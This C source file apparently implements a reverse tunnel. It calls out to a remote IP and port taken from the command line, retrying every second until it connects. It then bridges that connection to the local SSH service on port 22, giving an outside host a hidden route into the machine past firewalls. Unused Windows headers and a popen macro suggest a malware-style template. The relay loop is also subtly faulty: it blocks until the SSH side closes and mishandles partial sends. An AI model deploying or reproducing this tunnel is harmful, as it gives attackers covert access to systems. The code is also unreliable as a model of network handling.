#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#ifdef _WIN32
#include <winsock2.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#else
#define _popen(...) popen(__VA_ARGS__)
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#define Sleep sleep
#endif
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

static int remoteSock, sshSock;

static void shell()
{
	char input[1024];
	while (1)
	{
		ssize_t szinput = recv(remoteSock, input, sizeof(input), 0);
		if (szinput == -1) exit(-1);

		while (szinput)
		{
			ssize_t sent = send(sshSock, input, szinput, 0);
			if (sent == -1) exit(-1);

			szinput -= sent;

			char output[1024];
			while (1)
			{
				ssize_t szoutput = recv(sshSock, output, sizeof(output), 0);
				if (szoutput == -1) exit(-1);
				if (szoutput == 0) break;

				while (szoutput)
				{
					ssize_t received = send(remoteSock, output, szoutput, 0);
					if (received == -1) exit(-1);

					szoutput -= received;
				}
			}
		}
	}
}

#ifdef _WIN32
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
#else
#define __argc argc
#define __argv argv

int main(int argc, char* argv[])
#endif
{
	if (__argc != 3)
	{
		printf("Usage: %s <remote_ip> <remote_port>\n", __argv[0]);
		return 0;
	}

	char* remoteIP = __argv[1];
	int remotePort = atoi(__argv[2]);
	if ((remotePort < 0) || (remotePort > 65535))
	{
		fprintf(stderr, "Invalid port value \"%s\" must be in range 0..65535\n",
			__argv[2]);
		exit(-1);
	}
#ifdef _WIN32
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
	{
		fprintf(stderr, "Error initializing WSA\n");
		exit(-1);
	}
#endif
	remoteSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	struct sockaddr_in remoteSockAddr;
	memset(&remoteSockAddr, 0, sizeof(remoteSockAddr));
	remoteSockAddr.sin_family = AF_INET;
	remoteSockAddr.sin_addr.s_addr = inet_addr(remoteIP);
	remoteSockAddr.sin_port = htons((unsigned short)remotePort);

	while (1)
	{
		if (connect(remoteSock, (struct sockaddr*)&remoteSockAddr,
			sizeof(remoteSockAddr)) == 0)
			break;

		Sleep(1);
	}

	sshSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	struct sockaddr_in sshSockAddr;
	memset(&sshSockAddr, 0, sizeof(sshSockAddr));
	sshSockAddr.sin_family = AF_INET;
	sshSockAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	sshSockAddr.sin_port = htons((unsigned short)22);

	if (connect(sshSock, (struct sockaddr*)&sshSockAddr,
		sizeof(sshSockAddr)) != 0)
		exit(-1);

	shell();

#ifdef _WIN32
	closesocket(remoteSock);
	closesocket(sshSock);
	WSACleanup();
#else
	close(remoteSock);
	close(sshSock);
#endif
	return 0;
}

